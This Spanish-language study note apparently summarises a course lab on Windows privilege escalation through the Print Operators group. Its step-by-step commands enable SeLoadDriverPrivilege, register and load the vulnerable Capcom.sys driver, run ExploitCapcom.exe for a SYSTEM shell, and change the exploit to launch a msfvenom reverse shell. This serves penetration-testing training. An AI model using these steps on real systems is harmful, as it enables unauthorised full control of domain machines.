# Print Operators

[**Print Operators**](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#print-operators) es un grupo con privilegios elevados en un dominio: otorga entre otras cosas el privilegio `SeLoadDriverPrivilege` (capacidad de cargar drivers), permisos para gestionar impresoras en un Domain Controller, iniciar sesión localmente en un DC y apagarlo. El objetivo del flujo es: confirmar que la cuenta es miembro de Print Operators, habilitar `SeLoadDriverPrivilege`, instalar un driver vulnerable (Capcom.sys) y usar un exploit que aprovecha ese driver para conseguir una shell como SYSTEM.

---

## 1) Confirmar privilegios (`whoami /priv`)

Comando usado:

```
whoami /priv
```

**Qué muestra**: lista de privilegios de la cuenta actual. Columnas principales:

* `Privilege Name`: nombre interno del privilegio (ej. `SeLoadDriverPrivilege`).
* `Description`: descripción legible del privilegio.
* `State`: estado (`Enabled` o `Disabled`).

Ejemplo en el texto — salida parcial:

```
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled
```

**Interpretación**: si `SeLoadDriverPrivilege` no aparece habilitado desde un contexto sin elevar, hay que **bypassear UAC** o conseguir un contexto elevado.

---

## 2) Bypass UAC / obtener contexto elevado

El texto menciona el repo "UACMe" (lista de bypasses de UAC) o alternativamente abrir una consola administrativa desde GUI e introducir credenciales de la cuenta miembro de Print Operators. Tras hacerlo, al volver a ejecutar `whoami /priv`, `SeLoadDriverPrivilege` aparece pero inicialmente **Disabled** (luego se habilita con la PoC).

Salida de ejemplo tras acceso elevado:

```
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

---

## 3) Concepto: Capcom.sys y por qué explotar el driver

El driver `Capcom.sys` es conocido por permitir la ejecución de *shellcode* con privilegios SYSTEM cuando se carga y se explota adecuadamente. La estrategia es: usar el privilegio `SeLoadDriverPrivilege` para cargar `Capcom.sys` (malicioso/ vulnerable) y ejecutar exploit que realice *token stealing* o ejecute shellcode que derive en una shell SYSTEM.

---

## 4) Preparar la PoC que habilita el privilegio `SeLoadDriverPrivilege`

### Código (fragmento de includes)

El texto indica que debemos descargar la herramienta (PoC) localmente y reemplazar/pegar los includes siguientes en el archivo `EnableSeLoadDriverPrivilege.cpp`:

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

**Explicación de los includes**:

* `<windows.h>`: API principal de Win32 (tipos, funciones, macros).
* `<assert.h>`: macros de aserción (debug).
* `<winternl.h>`: definiciones internas de NT para llamadas nativas (NT API) — útil si la PoC usa `NtLoadDriver` u otras NT calls.
* `<sddl.h>`: funciones para manejar SDDL (Security Descriptor Definition Language).
* `<stdio.h>`: I/O en C (printf, etc.).
* `"tchar.h"`: macros para compatibilidad Unicode/ANSI (`TCHAR`, `TEXT()` etc.).

### Compilar con Visual Studio (cl.exe)

Comando usado en el texto:

```
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

**Explicación de los flags**:

* `cl`: compilador MSVC (desde "Developer Command Prompt for VS2019").
* `/DUNICODE /D_UNICODE`: definen los símbolos `UNICODE` y `_UNICODE` para compilar la aplicación en modo Unicode — hace que macros como `TEXT()` y tipos `TCHAR` apunten a versiones wide-char (wchar_t).
* El resultado es un `EnableSeLoadDriverPrivilege.exe` compilado con entrada wide-char.

Salida de ejemplo (resumida) que muestra el proceso de compilación y enlazado y el fichero `.exe` producido.

---

## 5) Añadir referencia al driver en el registro (HKCU)

El texto indica descargar `Capcom.sys` y guardarlo en `C:\temp` (o `C:\Tools\Capcom.sys` en ejemplos) y luego **crear claves** bajo `HKCU\System\CurrentControlSet\CAPCOM` con `reg add`.

Comandos del texto:

```
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

**Explicación**:

* `reg add <ruta>`: añade una clave/valor al registro.
* `HKCU\System\CurrentControlSet\CAPCOM`: la ruta bajo el hive del usuario actual (HKEY_CURRENT_USER). Normalmente drivers se registran en HKLM, pero aquí se está añadiendo una entrada bajo HKCU para aprovechar `SeLoadDriverPrivilege` si el sistema lo permite.
* `/v ImagePath`: nombre del valor que contendrá la ruta al driver.
* `/t REG_SZ`: tipo de dato (cadena).
* `/d "\\??\\C:\Tools\Capcom.sys"`: datos — la ruta al driver. Obsérvese la doble barra invertida por el shell y la sintaxis `\??\`.
* Segunda línea crea el valor `Type` con valor DWORD `1` (habitualmente `SERVICE_KERNEL_DRIVER` equivale a `1`, indicando que la entrada es un driver kernel).

**¿Qué es `\??\`?**

* `\??\` es una **NT Object Path** (ruta de objeto del espacio de nombres NT). El Win32 API acepta/parsea esa ruta y la resuelve a la ruta física correcta (por eso `\??\C:\Tools\Capcom.sys` apunta al archivo `C:\Tools\Capcom.sys`). El texto lo llama "odd syntax" y explica que la Win32 API la resuelve para localizar y cargar el driver.

---

## 6) Verificar que el driver NO esté cargado (DriverView)

Herramienta usada: `DriverView.exe` de Nirsoft.

Comandos del texto:

```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

**Explicación**:

* `DriverView.exe /stext drivers.txt`: exporta la lista de drivers a `drivers.txt` en formato texto.
* `Select-String -pattern Capcom`: en PowerShell, filtra `drivers.txt` buscando la cadena `Capcom`.
* Resultado esperado: ninguna coincidencia (driver no cargado aún).

---

## 7) Ejecutar la PoC para habilitar el privilegio

Comando:

```
EnableSeLoadDriverPrivilege.exe
```

Salida de ejemplo:

```
whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0
```

**Interpretación**: tras ejecutar la PoC, `SeLoadDriverPrivilege` aparece como `Enabled` — ahora la cuenta puede invocar `NtLoadDriver` para cargar el driver referenciado en el registro.

---

## 8) Verificar que Capcom aparece ahora listado

Repetir el volcado de drivers y filtrar por `Capcom`:

```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

Salida esperada:

```
Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```

Esto confirma que el driver fue cargado.

---

## 9) Compilar y ejecutar `ExploitCapcom.exe` para escalar

Comando (ejecutar el binario ya compilado):

```
.\ExploitCapcom.exe
```

Salida de ejemplo del exploit:

```
[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

**Qué hace**: el exploit obtiene handle sobre el driver, coloca shellcode en memoria del kernel/espacio permitido, ejecuta shellcode, realiza *token stealing* y lanza una shell con privilegios `NT AUTHORITY\SYSTEM`.

---

## 10) Alternativa sin GUI — modificar `ExploitCapcom.cpp`

El texto indica que si no hay acceso GUI (no se puede abrir `cmd.exe` localmente), hay que modificar el código fuente `ExploitCapcom.cpp` (línea 292 en el ejemplo) para cambiar el programa que se lanza tras explotar el driver.

Fragmento:

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

**Explicación de la función `CreateProcess` usada**:

* `CreateProcess(lpApplicationName, lpCommandLine, ...)` crea un nuevo proceso.
* En este ejemplo, `CommandLine` contiene la ruta a `cmd.exe` (doble `\\` por literal en C).
* `PROCESS_INFORMATION` y `STARTUPINFO` administran los handles y opciones de inicio.
* `CREATE_NEW_CONSOLE` indica crear una nueva consola.

**Cambio sugerido en el texto**: reemplazar la línea

```c
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
```

por

```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

y así lanzar un binario de *reverse shell* (`revshell.exe`) generado con `msfvenom`. El texto describe que se debe configurar un listener acorde al payload generado.

---

## 11) Automatizar: `EoPLoadDriver`

El texto menciona la herramienta `EoPLoadDriver` que automatiza pasos: habilitar el privilegio, crear la clave de registro y ejecutar `NtLoadDriver`.

Ejemplo de ejecución:

```
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-...\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0
```

**Interpretación**: `EoPLoadDriver` realiza automáticamente los pasos que antes hicimos manualmente (registro + habilitar) y ejecuta la llamada para cargar el driver. Luego se puede ejecutar `ExploitCapcom.exe` como se indicó antes.

---

## 12) Limpieza

Eliminar la clave que añadimos en HKCU:

```
reg delete HKCU\System\CurrentControlSet\Capcom
```

PowerShell/Prompt pedirá confirmación (Yes/No). El texto muestra la confirmación y la operación completada.

---

## 13) Nota final importante

**Desde Windows 10 versión 1803**, `SeLoadDriverPrivilege` **ya no es explotable** de la forma descrada porque no es posible incluir referencias a claves de registro bajo `HKEY_CURRENT_USER` para este propósito. Esta nota cierra el flujo y señala que la técnica tiene limitaciones en sistemas modernos.

---

## 14) Resumen rápido de los pasos

1. Confirmar privilegios con `whoami /priv`.
2. Obtener contexto elevado (bypass UAC o autenticación GUI) hasta ver `SeLoadDriverPrivilege` disponible.
3. Descargar y preparar la PoC `EnableSeLoadDriverPrivilege.cpp` y compilar con `cl /DUNICODE /D_UNICODE`.
4. Añadir la clave en `HKCU\System\CurrentControlSet\CAPCOM` con `ImagePath` apuntando a `\??\C:\Tools\Capcom.sys` y `Type=1`.
5. Verificar driver no cargado con `DriverView.exe`.
6. Ejecutar `EnableSeLoadDriverPrivilege.exe` para habilitar el privilegio.
7. Verificar driver listado.
8. Ejecutar `ExploitCapcom.exe` para ejecutar shellcode y obtener shell como SYSTEM.
9. (Opcional) Modificar `ExploitCapcom.cpp` para lanzar binario distinto (por ejemplo `revshell.exe`) si no hay GUI.
10. (Opcional) Automatizar con `EoPLoadDriver`.
11. Limpiar con `reg delete HKCU\System\CurrentControlSet\Capcom`.
12. Tener en cuenta la limitación desde Windows 10 1803.

---

